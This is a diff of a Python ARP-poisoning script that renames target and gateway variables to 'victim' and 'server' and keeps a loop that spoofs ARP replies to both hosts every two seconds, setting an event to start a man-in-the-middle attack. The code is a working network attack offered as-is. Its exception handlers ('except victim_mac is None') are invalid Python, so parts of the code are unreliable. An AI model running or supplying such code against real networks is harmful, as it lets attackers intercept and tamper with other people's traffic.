@@ -14,31 +14,31 @@ def poison(target_ip, target_mac, spoof_ip):
 
 def ARP_poison(start_mitm_event):
     try:
-        target_ip = "192.168.2.103"
-        gateway_ip = get_router_ip()
-        target_mac = get_mac(target_ip)
-        gateway_mac = get_mac(gateway_ip)
+        victim_ip = "192.168.2.100"
+        server_ip = "192.168.2.102"
+        victim_mac = get_mac(victim_ip)
+        server_mac = get_mac(server_ip)
 
 
-        print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
+        print(f"Target MAC: {victim_mac}, Gateway MAC: {server_mac}")
         while True:
             # Poison the target
-            poison(target_ip, target_mac, gateway_ip)
+            poison(victim_ip, victim_mac, server_ip)
             # Poison the gateway
-            poison(gateway_ip, gateway_mac, target_ip)
+            poison(server_ip, server_mac, victim_ip)
             time.sleep(2)  # Send every 2 seconds
             start_mitm_event.set()
     except KeyboardInterrupt:
         print("\nRestoring ARP tables. . .")
-        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
-        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
+        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=server_mac), count=4, verbose=False)
+        send(ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip, hwsrc=victim_mac), count=4, verbose=False)
         print("\nARP tables restored.")
 
-    except target_mac is None:
+    except victim_mac is None:
         print("Could not find target MAC")
-    except gateway_mac is None:
+    except server_mac is None:
         print("Could not find gateway MAC")
-    except gateway_ip is None:
+    except server_ip is None:
         print("Could not find gateway IP")
-    except target_ip is None:
+    except victim_ip is None:
         print("Target IP doesn't exist")
